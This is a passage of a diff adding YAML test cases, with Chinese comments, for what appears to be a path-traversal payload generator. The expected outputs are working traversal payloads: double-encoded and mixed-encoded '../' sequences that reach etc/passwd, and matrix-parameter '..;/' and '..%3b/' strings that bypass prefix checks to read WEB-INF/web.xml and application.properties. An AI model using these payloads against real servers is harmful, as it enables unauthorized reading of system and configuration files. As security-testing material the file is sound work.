+      # 默认档是「点明文 + 斜杠双重编码」，重复三次
+      payload: "..%252f..%252f..%252fetc/passwd"
+
+  - name: 多层编码混排穿越 · 三种混排
+    state:
+      vuln: traversal
+      template: traversal.generic.encoded.multi
+      slots: {form: "mixed_three", depth: "2"}
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "../%252e%252e/%2e%2e%252f../%252e%252e/%2e%2e%252fetc/passwd"
+
+  - name: 矩阵参数绕前缀校验
+    state:
+      vuln: traversal
+      template: traversal.generic.matrix
+      vars: {prefix: "/static", filepath: "WEB-INF/web.xml"}
+      outputs: [raw]
+    expect:
+      # prefix 是变量（要自己填），form.seq 是 "..;/"，depth 默认 2
+      payload: "/static/..;/..;/WEB-INF/web.xml"
+
+  - name: 矩阵参数绕前缀校验 · 编码分号 + 换前缀
+    state:
+      vuln: traversal
+      template: traversal.generic.matrix
+      slots: {form: "semicolon_enc", depth: "3"}
+      vars: {prefix: "/assets", filepath: "WEB-INF/classes/application.properties"}
+      outputs: [raw]
+    expect:
+      payload: "/assets/..%3b/..%3b/..%3b/WEB-INF/classes/application.properties"
